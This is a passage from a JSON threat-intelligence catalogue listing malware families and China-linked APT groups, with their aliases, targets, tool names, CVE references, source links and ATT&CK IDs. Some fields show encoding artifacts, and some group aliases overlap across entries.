["Zebrocy", "Zekapab"], "family": [], "comments": "A multilanguage family of modular downloaders, droppers, and backdoors deriving from Delphocy", "links": []}, {"names": ["SeduUploader", "JHUHUGIT", "JKEYSKW", "SofacyCarberp", "Sednit"], "family": [], "comments": "A first-stage downloader based on the Carberp banking Trojan. It serves as reconnaissance malware and can download a secondary backdoor such as XAgent", "links": []}, {"names": ["Sofacy", "SOURFACE"], "family": [], "comments": "A first-stage downloader that retrieves a second stage backdoor from a command-and-control server", "links": []}, {"names": ["BlackEnergy", "BE"], "family": [], "comments": null, "links": []}, {"names": ["BlackEnergy2 ", "BE2"], "family": [], "comments": null, "links": []}, {"names": ["GreyEnergy Mini", "FELIXROOT"], "family": [], "comments": null, "links": []}, {"names": ["Industroyer", "CrashOverride"], "family": [], "comments": "A modular malware designed to disrupt ICS processes in electrical substations. Industroyer consists of an initial backdoor, loader module, and several supporting and payload modules. The malware also includes a data wiper and a denial of service (DoS) tool targeted at Siemens SIPROTEC protection relays.", "links": []}, {"names": ["NotPetya", "GoldenEye", "ExPetr", "Nyetya", "Diskcoder.C"], "family": [], "comments": null, "links": []}]}, "actors": [{"china": {"actors": [{"names": ["Comment Crew", "Comment Panda", "PLA Unit 61398", "TG-8223", "APT1", "BrownFox", "GIF89a, ShadyRAT, Shanghai Group, Byzantine Candor"], "targets": "U.S. cybersecurity firm Mandiant, later purchased by FireEye, released a report in February 2013 that exposed one of China's cyber espionage units, Unit 61398. The group, which FireEye called APT1, is a unit within China's People's Liberation Army (PLA) that has been linked to a wide range of cyber operations targeting U.S. private sector entities for espionage purposes. The comprehensive report detailed evidence connecting APT1 and the PLA, offered insight into APT1's operational malware and methodologies, and provided timelines of the espionage it conducted.", "operations": ["GhostNet"], "description": null, "tools": ["WEBC2", "BISCUIT and many others"], "links": ["http://www.mcafee.com/us/resources/white-papers/wp-operation-shady-rat.pdf", "http://www.nytimes.com/2013/02/19/technology/chinas-army-is-seen-as-tied-to-hacking-against-us.html?emc=na&_r=2&", "https://www.secureworks.com/research/analysis-of-dhs-nccic-indicators", "https://www.scribd.com/doc/13731776/Tracking-GhostNet-Investigating-a-Cyber-Espionage-Network", "http://www.nartv.org/mirror/ghostnet.pdf"], "attck_id": "G0006", "comment": null}, {"names": ["APT2", "Putter Panda", "PLA Unit 61486", "TG-6952", "APT2", "SearchFire"], "targets": "This threat actor targets firms in the technology (communications, space, aerospace), research, defense, and government sectors in the United States for espionage purposes. The tools and infrastructure it uses overlap with PLA Unit 61398.", "operations": [], "description": null, "tools": ["Their activities are commonly known to be exploiting CVE-2012-0158 (MSOffice vulnerability in MSCOMCTL.OCX) in SpearPhising operations. Related malware: Moose", "Warp", "MSUpdater"], "links": ["http://cdn0.vox-cdn.com/assets/4589853/crowdstrike-intelligence-report-putter-panda.original.pdf", "http://icitech.org/icit-brief-chinas-espionage-dynasty-economic-death-by-a-thousand-cuts/"], "attck_id": "G0024", "comment": null}, {"names": ["UPS", "Gothic Panda", "TG-0110", "APT3", "Buckeye", "UPS Team", "Boyusec \u00e2\u0080\u0093 the Guangzhou Boyu Information Technology Company, Ltd"], "targets": "This threat actor targets and compromises entities in the defense, construction, technology, and transportation sectors. Up until 2015, it was primarily focused on U.S. and UK entities, but it shifted to Hong Kong\u00c3\u00a2\u00e2\u0082\u00ac\u00e2\u0080\u009cbased targets afterward. Aerospace and Defence; Construction and Engineering; Energy; High Tech; Nonprofit; Telecommunications; Transportation", "operations": ["Double Tap", "Clandestine Wolf"], "description": null, "tools": ["Shotput", "Pirpi", "PlugX/Sogu", "Kaba", "Cookie Cutter", "many 0days: IE", "Firefox", "and Flash", "SportLoader", "Shadow Brokers exploits", "DoublePulsar", "Bemstour", "Filensfer"], "links": ["https://www.fireeye.com/blog/threat-research/2015/06/operation-clandestine-wolf-adobe-flash-zero-day.html", "http://www.secureworks.com/resources/blog/research/threat-group-0110-targets-manufacturing-and-financial-organizations-via-phishing/", "http://www.symantec.com/connect/blogs/buckeye-cyberespionage-group-shifts-gaze-us-hong-kong", "https://intrusiontruth.wordpress.com/2017/05/09/apt3-is-boyusec-a-chinese-intelligence-contractor/", "https://www.fireeye.com/current-threats/apt-groups.html", "https://www.recordedfuture.com/chinese-mss-behind-apt3/", "http://freebeacon.com/national-security/u-s-indicts-three-chinese-hackers-linked-security-firm/amp/", "https://www.washingtonpost.com/world/national-security/china-hacked-a-navy-contractor-and-secured-a-trove-of-highly-sensitive-data-on-submarine-warfare/2018/06/08/6cc396fa-68e6-11e8-bea7-c8eb28bc52b1_story.html?noredirect=on&utm_term=.209df584e031", "https://intrusiontruth.wordpress.com/2018/05/22/the-destruction-of-apt3/", "https://www.symantec.com/blogs/threat-intelligence/buckeye-windows-zero-day-exploit"], "attck_id": "G0022", "comment": null}, {"names": ["IXESHE", "Numbered Panda", "TG-2754 (tentative)", "APT12", "BeeBus", "Calc Team", "DynCalc, Crimson Iron, DNSCalc"], "targets": "This threat actor targets organizations in Japan, Taiwan, and elsewhere in East Asia\u00c3\u00a2\u00e2\u0082\u00ac\u00e2\u0080\u009dincluding electronics manufacturers and telecommunications companies\u00c3\u00a2\u00e2\u0082\u00ac\u00e2\u0080\u009dfor espionage purposes.", "operations": [], "description": null, "tools": ["Etumbot", "Riptide", "Hightide", "ThreeByte", "Waterspout", "Mswab", "Gh0st", "ShowNews", "3001"], "links": ["http://www.crowdstrike.com/blog/whois-numbered-panda/", "http://www.computerworld.com/s/article/9241577/The_Chinese_hacker_group_that_hit_the_N.Y._Times_is_back_with_updated_tools?taxonomyId=17", "http://blog.crowdstrike.com/whois-numbered-panda/", "http://www.secureworks.com/cyber-threat-intelligence/threats/analysis-of-dhs-nccic-indicators/", "http://blog.trendmicro.com/taking-a-bite-out-of-ixeshe/", "http://www.arbornetworks.com/asert/2014/06/illuminating-the-etumbot-apt-backdoor/", "https://cysinfo.com/sx-2nd-meetup-reversing-and-decrypting-the-communications-of-apt-malware/", "http://blog.macnica.net/blog/2017/08/post-fb81.html"], "attck_id": "G0005", "comment": null}, {"names": ["APT16", "APT16"], "targets": "This threat actor targets and compromises Japanese and Taiwanese entities in the finance, tech, media, and government sectors.", "operations": [], "description": "Spear phishing email delivering a malicious Microsoft Word document exploiting EPS dict copy use-after-free vulnerability, and the local Windows privilege escalation vulnerability CVE-2015-1701. The successful exploitation of both vulnerabilities led to the delivery of either a downloader (IRONHALO), or a backdoor (ELMER). Also known to be using compromised VPN credentials to maintain network persistency. ", "tools": ["ELMER backdoor", "Gh0st", "HTRAN", "UNICAT", "Poison Ivy", "Pandora"], "links": ["https://www.fireeye.com/blog/threat-research/2015/12/the_eps_awakens.html", "https://www.fireeye.com/blog/threat-research/2015/12/the-eps-awakens-part-two.html", "https://securelist.com/analysis/publications/74828/cve-2015-2545-overview-of-current-threats/"], "attck_id": "G0023", "comment": null}, {"names": ["Hidden Lynx", "Aurora Panda", "APT17", "Deputy Dog", "Hidden Lynx", "Tailgater Team", "Axiom, SportsFans, Winnti Umbrella"], "targets": "Government, defense & aerospace, industrial engineering, NGOs", "operations": [], "description": null, "tools": ["BLACKCOFFEE", "WEBCnC", "Joy RAT", "PlugX", "Trojan.Naid", "Backdoor.Moudoor", "Backdoor.Vasport", "Backdoor.Boda", "Trojan.Hydraq", "ZxShell", "Sakula", "China Chopper", "DestroyRAT"], "links": ["http://www.fireeye.com/blog/technical/cyber-exploits/2013/09/operation-deputydog-zero-day-cve-2013-3893-attack-against-japanese-targets.html", "http://www.fireeye.com/blog/technical/cyber-exploits/2013/11/operation-ephemeral-hydra-ie-zero-day-linked-to-deputydog-uses-diskless-method.html", "http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/hidden_lynx.pdf", "http://www.darkreading.com/attacks-and-breaches/chinese--hidden-lynx--hackers-launch-widespread-apt-attacks/d/d-id/1111589?page_number=2", "https://www.rsaconference.com/writable/presentations/file_upload/crwd-t11-hide_and_seek-how_threat_actors_respond_in_the_face_of_public_exposure.pdf", "http://www.crowdstrike.com/blog/french-connection-french-aerospace-focused-cve-2014-0322-attack-shares-similarities-2012/", "https://401trg.com/burning-umbrella/", "https://www.infosecurity-magazine.com/news/chinese-espionage-group-widescale/", "https://intrusiontruth.wordpress.com/2019/07/24/apt17-is-run-by-the-jinan-bureau-of-the-chinese-ministry-of-state-security/"], "attck_id": "G0025", "comment": null}, {"names": ["Wekby", "Dynamite Panda", "TG-0416", "APT18", "TA428"], "targets": "Aerospace and Defence; Construction and Engineering; Education; Health and Biotechnology; High Tech; Telecommunications; Transportation", "operations": [], "description": null, "tools": ["HTTPBrowser", "TokenControl", "HcdLoader", "PisLoader"], "links": ["https://threatpost.com/apt-gang-branches-out-to-medical-espionage-in-community-health-breach/107828", "http://www.slideshare.net/CrowdStrike/crowd-casts-monthly-you-have-an-adversary-problem", "https://www.threatstream.com/blog/evasive-maneuvers-the-wekby-group-attempts-to-evade-analysis-via-custom-rop", "http://researchcenter.paloaltonetworks.com/2016/05/unit42-new-wekby-attacks-use-dns-requests-as-command-and-control-mechanism/", "https://paper.seebug.org/papers/APT/APT_CyberCriminal_Campagin/2012/NormanShark-MaudiOperation.pdf", "https://www.proofpoint.com/us/threat-insight/post/chinese-apt-operation-lagtime-it-targets-government-information-technology"], "attck_id": "G0026", "comment": null}, {"names": ["Axiom", "APT17", "Tailgater Team", "Dogfish (iDefense), Deputy Dog (iDefense), Winnti Umbrella"], "targets": null, "operations": [], "description": null, "tools": ["Winnti", "Gh0st RAT", "PoisonIvy", "HydraQ", "Hikit", "ZxShell", "Deputy Dog", "Derusbi", "PlugX", "HTRAN", "HDRoot", "Fscan", "Timestomper"], "links": ["http://securelist.com/blog/research/57585/winnti-faq-more-than-just-a-game/", "http://www.novetta.com/files/5614/1329/6232/novetta_cybersecurity_exec_summary-3.pdf", "http://www.novetta.com/2015/04/operation-smn-winnti-update/", "https://securelist.com/analysis/publications/72275/i-am-hdroot-part-1/", "https://401trg.com/burning-umbrella/", "https://blog.trendmicro.com/trendlabs-security-intelligence/supply-chain-attack-operation-red-signature-targets-south-korean-organizations/"], "attck_id": "G0001", "comment": "Use \"Skeleton Key\" on DCs"}, {"names": ["Winnti Group", "Wicked Panda", "APT41", "Winnti Umbrella, BARIUM, LEAD"], "targets": "ThyssenKrupp, Gameforge, Valve, Teamviewer,Siemens, Sumitomo, BASF, Covestro, Shin-Etsu, Bayer, Roche", "operations": [], "description": null, "tools": ["Winnti", "AceHash", "PlugX", "Webshells", "ZxShell"], "links": ["http://blog.trendmicro.com/trendlabs-security-intelligence/winnti-abuses-github/", "https://www.protectwise.com/blog/winnti-evolution-going-open-source.html", "https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2015/january/windows-firewall-hook-enumeration/", "https://www.nccgroup.trust/globalassets/our-research/uk/technical-advisories/2015/derusbi-server-technical-note-1-1-tlp-white.pdf", "https://lab52.io/blog/winnti-group-geostrategic-analysis-and-ttp/", "https://web.br.de/interaktiv/winnti/index.html"], "attck_id": "G0044", "comment": null}, {"names": ["Shell Crew", "Deep Panda", "WebMasters", "APT19", "KungFu Kittens", "Sh3llCr3w, PinkPanther, Winnti Group"], "targets": null, "operations": ["OPM", "Anthem Hack"], "description": null, "tools": ["Sakula/Sakurel", "Derusbi", "Scanbox Framework", "many Webshells including China Chopper", "WCE"], "links": ["http://cybercampaigns.net/wp-content/uploads/2013/06/Deep-Panda.pdf", "https://www.isightpartners.com/2015/07/threatscape-media-highlights-update-week-of-july-29th/", "https://www.fireeye.com/blog/threat-research/2017/06/phished-at-the-request-of-counsel.html"], "attck_id": "G0009", "comment": null}, {"names": ["Naikon", "Lotus Panda", "PLA Unit 78020", "Naikon", "APT30", "Thrip"], "targets": "satellite communications operator, Telecoms, and Defense Companies, Hong Kong", "operations": ["Naikon", "Camera Shy"], "description": null, "tools": ["RARSTONE", "BACKSPACe", "NETEAGLE", "XSControl"], "links": ["https://securelist.com/analysis/publications/69953/the-naikon-apt/", "http://blog.trendmicro.com/trendlabs-security-intelligence/rarstone-found-in-targeted-attacks/", "https://www.threatconnect.com/camerashy/", "https://cdn2.hubspot.net/hubfs/454298/Project_CAMERASHY_ThreatConnect_Copyright_2015.pdf?t=1443030820943&submissionGuid=407e0945-4acd-407c-8668-c5943f220e29", "http://www.crowdstrike.com/blog/rhetoric-foreshadows-cyber-activity-in-the-south-china-sea/", "https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets", "https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/", "https://www.symantec.com/blogs/threat-intelligence/thrip-apt-south-east-asia", "https://research.checkpoint.com/2020/naikon-apt-cyber-espionage-reloaded/"], "attck_id": "G0019", "comment": null}, {"names": ["Lotus Blossom", "Spring Dragon", "ST Group, Esile"], "targets": null, "operations": [], "description": null, "tools": ["Elise Backdoor", "Lstudio", "CVE-2017-11882"], "links": ["https://securelist.com/blog/research/70726/the-spring-dragon-apt/", "http://researchcenter.paloaltonetworks.com/2015/06/operation-lotus-blossom/", "https://securelist.com/blog/research/70726/the-spring-dragon-apt/", "http://www.trendmicro.com.my/vinfo/my/security/news/cyber-attacks/esile-targeted-attack-campaign-hits-apac-governments", "http://researchcenter.paloaltonetworks.com/2015/12/attack-on-french-diplomat-linked-to-operation-lotus-blossom/", "https://community.rsa.com/community/products/netwitness/blog/2018/01/30/apt32-continues-asean-targeting", "https://www.accenture.com/t20180127T003755Z__w__/us-en/_acnmedia/PDF-46/Accenture-Security-Dragonfish-Threat-Analysis.pdf", "https://securelist.com/ios-exploit-chain-deploys-lightspy-malware/96407/", "https://documents.trendmicro.com/assets/Tech-Brief-Operation-Poisoned-News-Hong-Kong-Users-Targeted-with-Mobile-Malware-via-Local-News-Links.pdf"], "attck_id": "G0030", "comment": null}, {"names": ["APT6", "APT6", "1.php Group"], "targets": "US Government Organizations", "operations": [], "description": null, "tools": ["Poison Ivy", ""], "links": ["https://motherboard.vice.com/read/fbi-flash-alert-hacking-group-has-had-access-to-us-govt-files-for-years", "https://www.zscaler.com/pdf/technicalbriefs/tb_advanced_persistent_threats.pdf", "https://www.zscaler.com/blogs/research/1php-group-intrusion-set-paper", "https://paper.seebug.org/papers/APT/APT_CyberCriminal_Campagin/2011/tb_advanced_persistent_threats.pdf"], "attck_id": null, "comment": "Overlaps with Operation Night Dragon"}, {"names": ["APT26", "Turbine Panda", "APT26", "Hippo Team", "JerseyMikes"], "targets": "Affected Industry: Aerospace and Defense, business and Professional Services/Legal/Accounting, High Tech Software and hardware services", "operations": [], "description": "Supply-chain attacks such as strategic web compromise (SWC) where the actor compromise 3rd-party service provider hosting the victim websites", "tools": ["Cobalt", "QuickPulse", "credential stealers such as WCE", "GSECDUMP", "COATHOOK", "HTRAN", "SOGU", "TWOCHAINS", "QUICKBALL"], "links": ["https://go.crowdstrike.com/rs/281-OBQ-266/images/15GlobalThreatReport.pdf?mkt_tok=3RkMMJWWfF9wsRojuKrPZKXonjHpfsX/7e8tWrHr08Yy0EZ5VunJEUWy2ocITtQ/cOedCQkZHblFnV4AS626XrENqKML", "https://www.crowdstrike.com/resources/wp-content/brochures/reports/huge-fan-of-your-work-intelligence-report.pdf", "https://digit.fyi/lengthy-cyber-espionage-operation-helped-china-develop-c919-airliner/"], "attck_id": null, "comment": null}, {"names": ["Mirage", "Vixen Panda", "Ke3Chang", "Playful Dragon", "GREF", "APT15", "Social Network Team", "Mirage Team, Lurid, Social Network Team, Royal APT, Metushy, Winnti Umbrella"], "targets": "PH, VN, TW, US, UK, IT, PL, UN, SG, NATO - Gov, Political party", "operations": [], "description": null, "tools": ["Mirage", "(Nvidia program side-loading) PlugX", "XSLCmd", "TidePool", "BS2005", "RoyalCli", "iWebRat", "Russian-language decoy document", "ENFAL", "ENDCMD", "QUICKHEAL", "SOGU", "CYFREE", "MIRAGE", "NOISEMAKER", "QUICKHEAL", "SWALLOWFLY"], "links": ["http://arstechnica.com/security/2015/04/elite-cyber-crime-group-strikes-back-after-attack-by-rival-apt-gang/", "https://www.fireeye.com/blog/threat-research/2014/09/forced-to-adapt-xslcmd-backdoor-now-on-os-x.html", "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-operation-ke3chang.pdf", "http://researchcenter.paloaltonetworks.com/2016/05/operation-ke3chang-resurfaces-with-new-tidepool-malware/", "https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/march/apt15-is-alive-and-strong-an-analysis-of-royalcli-and-royaldns/", "https://github.com/nccgroup/Royal_APT", "https://www.intezer.com/miragefox-apt15-resurfaces-with-new-tools-based-on-old-ones/", "https://401trg.com/burning-umbrella/", "https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/", "https://www.welivesecurity.com/2019/07/18/okrum-ke3chang-targets-diplomatic-missions/"], "attck_id": "G0004", "comment": "Some vendors track this group in up to 3 separate groups"}, {"names": ["NetTraveler", "NetTraveler", "APT21"], "targets": "This threat actor targets computer networks associated with Tibetan and Uyghur activists for espionage purposes.", "operations": [], "description": null, "tools": ["NetTraveler"], "links": ["https://securelist.com/blog/research/35936/nettraveler-is-running-red-star-apt-attacks-compromise-high-profile-victims/", "https://securelist.com/blog/incidents/57455/nettraveler-is-back-the-red-star-apt-returns-with-new-tricks/"], "attck_id": null, "comment": null}, {"names": ["Ice Fog", "Dagger Panda", "IceFog", "ICEFOG", "Fucobha, Temp.Trident"], "targets": "This threat actor targets government institutions, military contractors, maritime and shipbuilding groups, telecommunications operators, and others, primarily in US, Taiwan, Japan and South Korea.", "operations": [], "description": null, "tools": ["Dagger Three (C2 software)", "Fucobha Backdoor", "IceFog", "RoyalRoad RTF Weaponizer"], "links": ["https://securelist.com/blog/research/57331/the-icefog-apt-a-tale-of-cloak-and-three-daggers/", "https://securelist.com/blog/incidents/58209/the-icefog-apt-hits-us-targets-with-java-backdoor/", "http://kasperskycontenthub.com/wp-content/uploads/sites/43/vlpdfs/icefog.pdf", "http://www.darkreading.com/attacks-and-breaches/java-icefog-malware-variant-infects-us-businesses/d/d-id/1113451", "https://www.anomali.com/blog/analyzing-digital-quartermasters-in-asia-do-chinese-and-indian-apts-have-a-shared-supply-chain", "https://speakerdeck.com/ashley920/into-the-fog-the-return-of-icefog-apt"], "attck_id": null, "comment": null}, {"names": ["Beijing Group", "Sneaky Panda", "Hydraq, SIG22, Elderwood, Elderwood Gang"], "targets": "This threat actor targets private sector companies in the defense, shipping, aeronautics, arms, and energy sectors, as well as nonprofits and financial firms.", "operations": [], "description": null, "tools": ["Hydraq", "Elderwood Project"], "links": ["https://en.wikipedia.org/wiki/Operation_Aurora#Attackers_involved", "http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/the-elderwood-project.pdf", "http://www.csmonitor.com/USA/2012/0914/Stealing-US-business-secrets-Experts-ID-two-huge-cyber-gangs-in-China", "https://blog.crysys.hu/2018/03/territorial-dispute-nsas-perspective-on-apt-landscape/"], "attck_id": "G0066", "comment": "Possibly assisted in Operation Aurora, the RSA incident, and the Joint Strike Fighter Program compromise"}, {"names": ["APT22"], "targets": null, "operations": [], "description": null, "tools": ["China Chopper"], "links": ["http://www.slideshare.net/CTruncer/ever-present-persistence-established-footholds-seen-in-the-wild"], "attck_id": null, "comment": "Possible overlap with Beijing Group"}, {"names": ["Suckfly"], "targets": "Indian organisations and Republic of Korea", "operations": [], "description": null, "tools": ["Nidiran", "Korplug", "PlugX"], "links": ["http://www.symantec.com/connect/blogs/suckfly-revealing-secret-life-your-code-signing-certificates"], "attck_id": "G0039", "comment": null}, {"names": ["APT4", "Samurai Panda", "PLA Navy", "APT4", "APT4", "Wisp Team"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["http://www.crowdstrike.com/blog/whois-samurai-panda/"], "attck_id": null, "comment": "\u00e2\u0080\u009cPdPD\u00e2\u0080\u009d (50 64 50 44) marker for encrypted binaries"}, {"names": ["Pitty Tiger", "Pitty Panda", "Pitty Tiger"], "targets": null, "operations": [], "description": null, "tools": ["PittyTiger", "Paladin RAT"], "links": ["http://blog.airbuscybersecurity.com/post/2014/07/The-Eye-of-the-Tiger2", "https://www.fireeye.com/blog/threat-research/2014/07/spy-of-the-tiger.html", "http://blog.malwaretracker.com/2013/06/tomato-garden-campaign-possible.html"], "attck_id": null, "comment": "\"Pitty Tiger\" was originally the name of a malware payload by the malware tracker blog. Airbus and FireEye identified the actor as Chinese.  CrowdStrike uses \"tiger\" when naming adversaries alligned with India.  Crowdstrike associates the actor with the name \"Pitty Panda\" conforming to their naming convention for Chinese actors."}, {"names": ["Scarlet Mimic"], "targets": "Uyghur and Tibetan activists as well as those who are interested in their causes", "operations": [], "description": null, "tools": ["FakeM", "Psylo", "MobileOrder"], "links": ["http://researchcenter.paloaltonetworks.com/2016/01/scarlet-mimic-years-long-espionage-targets-minority-activists/"], "attck_id": "G0029", "comment": null}, {"names": ["C0d0so", "Codoso", "APT19", "Sunshop Group"], "targets": "Forbes,  Defense, Finance, Energy, Government, Political Dissidents, Global Think Tanks", "operations": [], "description": "Watering Hole", "tools": ["Bergard Trojan", "Derusbi", "TXER"], "links": ["https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks", "http://www.isightpartners.com/2015/02/codoso/#sthash.VJMDVPQB.dpuf", "http://researchcenter.paloaltonetworks.com/2016/01/new-attacks-linked-to-c0d0s0-group/", "https://www.proofpoint.com/us/threat-insight/post/exploring-bergard-old-malware-new-tricks"], "attck_id": "G0073", "comment": null}, {"names": ["SVCMONDR"], "targets": "Taiwan, Thailand", "operations": [], "description": null, "tools": ["CVE-2015-2545"], "links": ["https://securelist.com/analysis/publications/74828/cve-2015-2545-overview-of-current-threats/"], "attck_id": null, "comment": "\u00e2\u0080\u009cPdPD\u00e2\u0080\u009d (50 64 50 44) marker for encrypted binaries"}, {"names": ["Wisp Team", "APT4", "Wisp Team"], "targets": "Defense Industrial Base, US Government", "operations": [], "description": null, "tools": [], "links": ["https://www.isightpartners.com/2014/04/weeks-threatscape-media-highlights-update-2/", "https://www.isightpartners.com/2014/09/weeks-threatscape-media-highlights-update-22/", "https://www.isightpartners.com/2015/01/threatscape-media-highlights-update-week-january-12/"], "attck_id": null, "comment": "iSight has mentioned tracking a China-nexus group they dub \"Wisp Team\" - have not resolved this w/ other naming conventions"}, {"names": ["Mana Team", "Mana Team"], "targets": "Australia", "operations": [], "description": null, "tools": [], "links": ["https://www.isightpartners.com/2016/02/threatscape-media-highlights-update-week-of-february-17th/"], "attck_id": null, "comment": "iSight has mentioned tracking a China-nexus activity they dub \"Mana Team\", targeting Australian interests - have not resolved this w/ other naming conventions"}, {"names": ["TEMP.Zhenbao", "TEMP.Zhenbao"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["https://www.isightpartners.com/2014/11/threatscape-media-highlights-update-week-november-10/", "http://www.securityweek.com/plugx-rat-used-gather-intel-afghan-russian-military-report"], "attck_id": null, "comment": null}, {"names": ["SPIVY"], "targets": "Hong Kong dissidents", "operations": [], "description": null, "tools": [], "links": ["http://researchcenter.paloaltonetworks.com/2016/04/unit42-new-poison-ivy-rat-variant-targets-hong-kong-pro-democracy-activists/"], "attck_id": null, "comment": null}, {"names": ["Mofang"], "targets": "Government, military, Critical Infrastructure,Automotive Industry*,Weapon Industry*, This threat actor compromises government and critical infrastructure entities, primarily in Myanmar, for espionage purposes. Myanmar, Canada, United States, Germany, India, South Korea, Singapore", "operations": [], "description": null, "tools": ["ShimRAT", "ShimRATReporter"], "links": ["https://blog.fox-it.com/2016/06/15/mofang-a-politically-motivated-information-stealing-adversary/", "https://www.threatconnect.com/china-superman-apt/"], "attck_id": null, "comment": null}, {"names": ["DragonOK", "DragonOK"], "targets": "Japan", "operations": [], "description": null, "tools": ["CVE-2015-1641", "Sysget", "IsSpace", "Rambo Backdoor"], "links": ["http://researchcenter.paloaltonetworks.com/2015/04/unit-42-identifies-new-dragonok-backdoor-malware-deployed-against-japanese-targets/", "http://researchcenter.paloaltonetworks.com/2017/01/unit42-dragonok-updates-toolset-targets-multiple-geographic-regions/", "https://blogs.forcepoint.com/security-labs/trojanized-adobe-installer-used-install-dragonok%E2%80%99s-new-custom-backdoor", "http://www.morphick.com/resources/news/deep-dive-dragonok-rambo-backdoor", "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-operation-quantum-entanglement.pdf"], "attck_id": "G0017", "comment": null}, {"names": ["Group 27"], "targets": null, "operations": [], "description": null, "tools": ["Trochilus RAT", "PlugX", "EvilGrab", "3102 variant of 9002 RAT"], "links": ["https://www.arbornetworks.com/blog/asert/wp-content/uploads/2016/01/ASERT-Threat-Intelligence-Brief-2015-08-Uncovering-the-Seven-Pointed-Dagger.pdf", "https://unit42.paloaltonetworks.com/unit42-trochilus-rat-new-moonwind-rat-used-attack-thai-utility-organizations/"], "attck_id": null, "comment": null}, {"names": ["Tonto Team", "CactusPete", "Tonto Team"], "targets": null, "operations": [], "description": null, "tools": [], "links": ["https://www.wsj.com/articles/chinas-secret-weapon-in-south-korea-missile-fight-hackers-1492766403?emailToken=JRrydPtyYnqTg9EyZsw31FwuZ7JNEOKCXF7LaW/HM1DLsjnUp6e6wLgph560pnmiTAN/5ssf7moyADPQj2p2Gc+YkL1yi0zhIiUM9M6aj1HTYQ==", "https://www.fireeye.com/content/dam/fireeye-www/summit/cds-2019/presentations/cds19-executive-s08-achievement-unlocked.pdf"], "attck_id": null, "comment": null}, {"names": ["TA459"], "targets": "Central Asian countries, Russia, Belarus, Mongolia, and others", "operations": [], "description": null, "tools": ["PlugX", "NetTraveler", "ZeroT", "PCrat", "Gh0st"], "links": ["https://www.proofpoint.com/us/threat-insight/post/apt-targets-financial-analysts#.WS3IBVFV4no.twitter"], "attck_id": "G0062", "comment": null}, {"names": ["Tick", "BRONZE BUTLER", "Tick", "REDBALDKNIGHT"], "targets": null, "operations": [], "description": null, "tools": ["whoami", "procdump", "VBS", "WCE", "Mimikatz", "gsecdump", "PsExec", "Daserf", "Gofarer", "Datper", "ABK Downloader", "avirra Downloader", "Datper", "RoyalRoad RTF Weaponizer"], "links": ["https://www.symantec.com/connect/blogs/tick-cyberespionage-group-zeros-japan", "https://www.secureworks.jp/resources/rp-bronze-butler", "https://researchcenter.paloaltonetworks.com/2017/07/unit42-tick-group-continues-attacks/", "http://blog.jpcert.or.jp/2017/08/detecting-datper-malware-from-proxy-logs.html", "https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses", "http://blog.trendmicro.com/trendlabs-security-intelligence/redbaldknight-bronze-butler-daserf-backdoor-now-using-steganography/", "https://blog.talosintelligence.com/2018/10/tracking-tick-through-recent-campaigns.html", "https://blog.trendmicro.com/trendlabs-security-intelligence/operation-endtrade-finding-multi-stage-backdoors-that-tick/", "https://jsac.jpcert.or.jp/archive/2020/pdf/JSAC2020_8_koike-nakajima_jp.pdf"], "attck_id": "G0060", "comment": null}, {"names": ["Lucky Cat", "Shadow Network, SabPub"], "targets": "A threat actor targets computer networks associated with Tibetan activists, as well as military research and development, aerospace, engineering, and shipping industries in India and Japan.", "operations": [], "description": null, "tools": [], "links": ["http://blog.trendmicro.com/trendlabs-security-intelligence/luckycat-redux-inside-an-apt-campaign/", "http://www.nartv.org/mirror/shadows-in-the-cloud.pdf", "https://securelist.com/blog/incidents/33208/new-version-of-osx-sabpub-confirmed-mac-apt-attacks-19/", "http://www.securityweek.com/mac-malware-linked-luckycat-attack-campaign", "http://www.infoworld.com/article/2617225/malware/sabpub-malware-proves-macs-are-an-apt-target.html", "https://blog.talosintelligence.com/2019/02/exilerat-shares-c2-with-luckycat.html", "https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/the_luckycat_hackers.pdf"], "attck_id": null, "comment": null}, {"names": ["APT40", "Leviathan", "APT40", "Temp.Periscope", "Temp.Jumper, GADOLINIUM, MUDCARP, Hainan Xiandun Technology Company"], "targets": "maritime-related targets across multiple verticals, including engineering firms, shipping and transportation, manufacturing, defense, government offices, and research universities", "operations": [], "description": null, "tools": ["AIRBREAK", "BADFLICK", "PHOTO", "HOMEFRY", "LUNCHMONEY", "MURKYTOP", "China Chopper", "Beacon", "BLACKCOFFEE", "CVE-2017-11882", "Derusbi", "RoyalRoad RTF Weaponizer"], "links": ["https://www.proofpoint.com/us/threat-insight/post/leviathan-espionage-actor-spearphishes-maritime-and-defense-targets", "https://www.fireeye.com/blog/threat-research/2018/03/suspected-chinese-espionage-group-targeting-maritime-and-engineering-industries.html", "https://www.fireeye.com/blog/threat-research/2018/07/chinese-espionage-group-targets-cambodia-ahead-of-elections.html", "https://www.fireeye.com/blog/threat-research/2019/03/apt40-examining-a-china-nexus-espionage-actor.html", "https://www.anomali.com/blog/analyzing-digital-quartermasters-in-asia-do-chinese-and-indian-apts-have-a-shared-supply-chain", "https://lab52.io/blog/leviathan-geostrategy-and-ttp-technical-tactics-and-procedures/", "https://prezi.com/view/jGyAzyy5dTOkDrtwsJi5/", "https://intrusiontruth.wordpress.com/2020/01/09/what-is-the-hainan-xiandun-technology-development-company/", "https://intrusiontruth.wordpress.com/2020/01/10/who-is-mr-gu/", "https://intrusiontruth.wordpress.com/2020/01/13/who-else-works-for-this-cover-company-network/", "https://intrusiontruth.wordpress.com/2020/01/14/who-is-mr-ding/", "https://intrusiontruth.wordpress.com/2020/01/15/hainan-xiandun-technology-company-is-apt40/", "https://jsac.jpcert.or.jp/archive/2020/pdf/JSAC2020_8_koike-nakajima_jp.pdf"], "attck_id": "G0065", "comment": null}, {"names": ["PassCV", "TG-3279", "Winnti Umbrella, China Cracking Group, "], "targets": "Gaming Companies", "operations": [], "description": null, "tools": ["Sabre", "Kitkiot", "Conpee", "Etso", "Runxx", "dnsenum", "s (custom port scanner)", 